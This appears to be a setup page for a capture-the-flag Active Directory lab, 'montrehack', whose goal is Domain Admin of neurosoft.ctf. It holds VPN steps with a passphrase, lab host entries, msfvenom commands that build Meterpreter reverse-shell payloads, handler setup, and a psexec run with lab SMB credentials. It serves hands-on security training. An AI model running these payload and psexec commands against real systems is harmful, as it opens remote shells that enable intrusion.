# Rules

Because we will be sharing the same environment, please consider the following rules:

- Avoid Migrate
  - Steal Tokens instead
- Avoid Spawning unnecessary processes
- Do not change passwords
- Do not delete files


# VPN

1. Download the file `openvpn-montrehack.ovpn` below
2. Run: `openvpn --config openvpn-montrehack.ovpn`
3. The passphrase is: 9Fi?U8(p3iZ*WkBy{b4w'<YFMXa@r6KT


# Add this to your `/etc/hosts`

```
9000:470:beef::10	           dc.neurosoft.ctf
9000:470:beef::11	           svc.neurosoft.ctf
9000:470:beef::12	           dev.neurosoft.ctf
9000:470:beef:cafe:cafe::20  dc01.nsresearch.ctf
9000:470:beef:cafe:cafe::21  vault.nsresearch.ctf
9000:470:beef:dead::48       mail.neurosoft.ctf
```


# Generate payloads

Might be useful but not necessary depending on your style.

```
msfvenom -p windows/meterpreter/reverse_ipv6_tcp LHOST=”$my_ipv6" LPORT=8080 -f exe -o “payload_msf_x86.exe” -a x86
msfvenom -p windows/x64/meterpreter_reverse_ipv6_tcp LHOST=”$my_ipv6" LPORT=8081 -f exe -o “payload_msf_x64.exe” -a x64
```


# Setup Handlers

```
setg ExitOnSession false
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_ipv6_tcp
set LHOST ::
set LPORT 8080
run -j
set PAYLOAD windows/x64/meterpreter_reverse_ipv6_tcp
set LPORT 8081
run -j
```

# Pop your first shell

```
use windows/smb/psexec
set PAYLOAD windows/meterpreter/reverse_ipv6_tcp
set RHOST 9000:470:beef::12
set LHOST <YOUR IPv6 IN SUBNET FC00:1337:2:0::/64>
set LPORT 8080
set SMBUser nsec
set SMBPass MontrehackRocks!
set DisablePayloadHandler true
run
```

# Your mission

Get Domain Admin of neurosoft.ctf
